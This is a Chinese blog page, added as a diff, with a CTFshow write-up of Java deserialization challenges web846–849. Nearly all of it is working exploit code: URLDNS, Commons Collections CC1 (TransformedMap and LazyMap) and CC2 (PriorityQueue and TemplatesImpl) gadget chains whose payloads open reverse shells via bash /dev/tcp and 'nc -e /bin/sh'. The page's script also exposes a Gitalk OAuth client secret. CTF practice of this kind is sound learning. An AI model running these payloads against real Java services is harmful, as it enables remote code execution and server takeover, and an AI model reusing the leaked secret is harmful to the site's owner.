@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>[ctfshow]JAVA反序列化 | fallingskies</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://fallingskies22.github.io/favicon.ico?v=1724150366542">
+<link rel="stylesheet" href="https://fallingskies22.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="web846
+这题是利用URLDNS链。
+import java.io.*;
+import java.util.Base64;
+import java.util.HashMap;
+import java.net.URL;
+
+
+public ..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://fallingskies22.github.io">
+        <img src="https://fallingskies22.github.io/images/avatar.png?v=1724150366542" class="site-logo">
+        <h1 class="site-title">fallingskies</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/post/friends" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      <h3>想要去月球<h3>
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://fallingskies22.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">[ctfshow]JAVA反序列化</h2>
+            <div class="post-date">2024-03-19</div>
+            
+              <div class="feature-container" style="background-image: url('https://fallingskies22.github.io/post-images/ctfshowjava-fan-xu-lie-hua.png')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <h2 id="web846">web846</h2>
+<p>这题是利用URLDNS链。</p>
+<pre><code class="language-java">import java.io.*;
+import java.util.Base64;
+import java.util.HashMap;
+import java.net.URL;
+
+
+public class chall1 {
+    public static void main(String[] args) throws Exception {
+        HashMap map = new HashMap();
+        URL url = new URL(&quot;http://9655e930-62a3-4ccd-910c-0357db4827df.challenge.ctf.show&quot;);
+        map.put(url,1); 
+        String data = serialize(map);
+        System.out.println(data);
+    }
+
+    public static String serialize(Object obj) throws IOException{
+        ByteArrayOutputStream byteArrayOutputStream =new ByteArrayOutputStream();
+        ObjectOutput outputStream =new ObjectOutputStream(byteArrayOutputStream);
+        outputStream.writeObject(obj);
+        outputStream.flush();
+        outputStream.close();
+        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
+    }
+}
+</code></pre>
+<h2 id="web847">web847</h2>
+<p>这题直接利用cc1链getshell。</p>
+<pre><code class="language-java">import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+
+import java.io.*;
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.util.Base64;
+import java.util.HashMap;
+import java.util.Map;
+
+public class web847 {
+    public static void main(String[] args) throws Exception {
+
+        byte[] shellBytes = (&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;).getBytes();
+        String shellStr = Base64.getEncoder().encodeToString(shellBytes);
+
+        Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[] {String.class, Class[].class }, new Object[] {&quot;getRuntime&quot;, new Class[0] }),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
+                new InvokerTransformer(&quot;exec&quot;, new Class[] {String.class }, new Object[] {&quot;bash -c {echo,&quot;+shellStr+&quot;}|{base64,-d}|{bash,-i}&quot;})
+        };
+        //将transformers数组存入ChainedTransformer这个继承类
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+        //创建Map并绑定transformerChina
+        HashMap innerMap = new HashMap();
+        innerMap.put(&quot;value&quot;, &quot;value&quot;);
+
+
+        //给予map数据转化链
+        Map outerMap = TransformedMap.decorate(innerMap, null, chainedTransformer);
+        //反射机制调用AnnotationInvocationHandler类的构造函数
+        Class cl = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
+        //取消构造函数修饰符限制
+        ctor.setAccessible(true);
+        //获取AnnotationInvocationHandler类实例
+        Object instance = ctor.newInstance(Target.class, outerMap);
+        String data = serializeToBase64(instance);
+        System.out.println(data);
+
+        unserializeFromBase64(data);
+    }
+
+    public static String serializeToBase64(Object obj) throws IOException {
+        ByteArrayOutputStream byteArrayOutputStream =new ByteArrayOutputStream();
+        ObjectOutput outputStream =new ObjectOutputStream(byteArrayOutputStream);
+        outputStream.writeObject(obj);
+        outputStream.flush();
+        outputStream.close();
+        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
+    }
+
+    //定义反序列化方法
+    public static void unserializeFromBase64(String str) throws Exception{
+        byte[] data = Base64.getDecoder().decode(str);
+        ByteArrayInputStream byteArrayInputStream =new ByteArrayInputStream(data);
+        ObjectInputStream objectInputStream=new ObjectInputStream(byteArrayInputStream);
+        objectInputStream.readObject();
+    }
+
+}
+</code></pre>
+<p>这里要记得传参数时要url编码，因为没有编码，一直报suid错误，我还一直以为版本不对🤣<br>
+<img src="https://fallingskies22.github.io/post-images/1710859867444.png" alt="" loading="lazy"></p>
+<h2 id="web848">web848</h2>
+<p>这里过滤了TransformedMap类，我们使用LazyMap可以绕过。<br>
+ysoserial中也是使用的LazyMap这条链。</p>
+<pre><code class="language-java">import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.*;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.util.Base64;
+import java.util.HashMap;
+import java.util.Map;
+
+public class web848 {
+    public static void main(String[] args) throws Exception {
+        byte[] shellBytes = (&quot;bash -i &gt;&amp;/dev/tcp/ip/port 0&gt;&amp;1&quot;).getBytes();
+        String shellStr = Base64.getEncoder().encodeToString(shellBytes);
+
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
+                new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;bash -c {echo,&quot;+shellStr+&quot;}|{base64,-d}|{bash,-i}&quot;})
+        };
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();
+        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);
+
+        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);
+        annotationInvocationHandlerConstructor.setAccessible(true);
+        // 注解可以乱填，因为动态代理的invoke只需要在readObject种执行一个无参方法即可触发，不需要过后面的判断
+        InvocationHandler h = (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class, lazyMap);
+        // 这里动态代理一个LazyMap可以实现readObject-&gt;invoke-&gt;get
+        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, h);
+        Object obj = annotationInvocationHandlerConstructor.newInstance(Override.class, mapProxy);
+
+        String payload = serializeToBase64(obj);
+        System.out.println(payload);
+        unserializeFromBase64(payload);
+    }
+    public static String serializeToBase64(Object obj) throws IOException {
+        ByteArrayOutputStream byteArrayOutputStream =new ByteArrayOutputStream();
+        ObjectOutput outputStream =new ObjectOutputStream(byteArrayOutputStream);
+        outputStream.writeObject(obj);
+        outputStream.flush();
+        outputStream.close();
+        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
+    }
+
+    public static void unserializeFromBase64(String str) throws Exception{
+        byte[] data = Base64.getDecoder().decode(str);
+        ByteArrayInputStream byteArrayInputStream =new ByteArrayInputStream(data);
+        ObjectInputStream objectInputStream=new ObjectInputStream(byteArrayInputStream);
+        objectInputStream.readObject();
+    }
+</code></pre>
+<h2 id="web849">web849</h2>
+<p>环境使用了commons-collections4.0和jdk8<br>
+可以使用cc2链</p>
+<p>cc2链结尾可以用之前的Runtime.getRuntime().exec也可以用新引入的字节码加载方式TemplateImpl（ysoserial里用的后面这种）。</p>
+<p>第一种方式：</p>
+<pre><code class="language-java">package org.example;
+
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.Base64;
+import java.util.PriorityQueue;
+
+
+
+public class web849 {
+    public static void main(String[] args) throws Exception {
+
+        Transformer[]  transformers= new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class,Class[].class}, new Object[]{&quot;getRuntime&quot;,null}),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class,Object[].class}, new Object[]{null,null}),
+                new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;nc ip port -e /bin/sh&quot;})
+        };
+
+        ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);
+        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
+        PriorityQueue priorityQueue = new PriorityQueue(1);
+
+        priorityQueue.add(1);
+        priorityQueue.add(2);//传入两个参数
+
+//        Field size = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;size&quot;);//反射获取成员变量的field
+//        size.setAccessible(true);//获取访问权限
+//        size.set(priorityQueue,2);//设置参数
+
+
+        Field field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);//反射获取成员变量的field
+        field.setAccessible(true);//获取访问权限
+        field.set(priorityQueue,transformingComparator);//设置参数
+
+        String payload = serializeToBase64(priorityQueue);
+        System.out.println(payload);
+        unserializeFromBase64(payload);
+
+    }
+    public static String serializeToBase64(Object obj) throws IOException {
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+        ObjectOutput outputStream = new ObjectOutputStream(byteArrayOutputStream);
+        outputStream.writeObject(obj);
+        outputStream.flush();
+        outputStream.close();
+        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
+    }
+
+    public static void unserializeFromBase64(String str) throws Exception {
+        byte[] data = Base64.getDecoder().decode(str);
+        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(data);
+        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
+        objectInputStream.readObject();
+    }
+
+
+}
+</code></pre>
+<p>第二种方式：</p>
+<pre><code class="language-java">package org.example;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import javassist.ClassPool;
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.Base64;
+import java.util.PriorityQueue;
+
+public class web849 {
+
+    public static void main(String[] args) throws Exception {
+
+        TemplatesImpl obj = new TemplatesImpl();
+        setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]{
+                //取当前目录下的类路径EvilTemplatesImpl.class.getName()，如果在当前目录下可以直接写类名即可
+                ClassPool.getDefault().get(EvilTemplatesImpl.class.getName()).toBytecode()
+        });
+        setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);
+
+
+        Transformer[]  transformers= new Transformer[]{
+                new ConstantTransformer(obj),
+                new InvokerTransformer(&quot;newTransformer&quot;,null,null),
+
+        };
+
+        ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);
+
+        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
+
+        PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);
+
+        setFieldValue(priorityQueue, &quot;size&quot;, 8);
+
+        String payload = serializeToBase64(priorityQueue);
+        System.out.println(payload);
+
+        unserializeFromBase64(payload);
+
+
+    }
+
+    public static String serializeToBase64(Object obj) throws IOException {
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+        ObjectOutput outputStream = new ObjectOutputStream(byteArrayOutputStream);
+        outputStream.writeObject(obj);
+        outputStream.flush();
+        outputStream.close();
+        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
+    }
+
+    public static void unserializeFromBase64(String str) throws Exception {
+        byte[] data = Base64.getDecoder().decode(str);
+        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(data);
+        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
+        objectInputStream.readObject();
+    }
+
+    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+
+}
+</code></pre>
+<p>EvilTemplatesImpl.java</p>
+<pre><code class="language-java">package org.example;
+
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+import java.io.IOException;
+
+public class EvilTemplatesImpl extends AbstractTranslet {
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+    public EvilTemplatesImpl () throws IOException {
+        Runtime.getRuntime().exec(&quot;nc ip port -e /bin/sh&quot;);
+    }
+}
+</code></pre>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://fallingskies22.github.io/post/vishwactf2024-reverse-writeup/">
+                  <h3 class="post-title">
+                    VishwaCTF2024 - Reverse - Writeup
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: '1b08861b8ad19018640e',
+        clientSecret: '1881a7245597aa70e1ffc8412e5b6c1eb0ad7241',
+        repo: 'fallingskies22.github.io',
+        owner: 'fallingskies22',
+        admin: ['fallingskies22'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
